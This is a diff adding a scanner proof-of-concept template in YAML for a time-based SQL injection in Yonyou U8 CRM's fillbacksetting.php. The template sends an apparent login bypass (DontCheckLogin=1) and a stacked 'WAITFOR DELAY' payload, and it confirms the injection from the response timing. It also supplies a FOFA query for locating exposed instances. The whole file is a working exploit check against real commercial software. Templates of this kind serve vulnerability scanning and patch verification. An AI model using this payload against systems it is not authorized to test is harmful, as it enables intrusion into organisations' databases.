@@ -1,0 +1,41 @@
+id: poc-yaml-yongyou-u8-crm-fillbacksetting-sqli
+info:
+  name: 用友U8 CRM config/fillbacksetting.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8+CRM
+  fofa: title="用友U8CRM"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: GET
+  path: /config/fillbacksetting.php?DontCheckLogin=1&action=delete&id=-99;WAITFOR+DELAY+'0:0:{{.t1}}'--
+  headers:
+    Cookie: PHPSESSID=bgsesstimeout-;
+  expression: 'status_code == 200 &&
+
+    duration >= t1 &&
+
+    duration <= t2 &&
+
+    contains(body,`{"success":true}`)
+
+    '
+- method: GET
+  path: /config/fillbacksetting.php?DontCheckLogin=1&action=delete&id=-99;WAITFOR+DELAY+'0:0:{{.t3}}'--
+  headers:
+    Cookie: PHPSESSID=bgsesstimeout-;
+  expression: 'status_code == 200 &&
+
+    duration >= t3 &&
+
+    duration <= t4 &&
+
+    contains(body,`{"success":true}`)
+
+    '
+transport: http
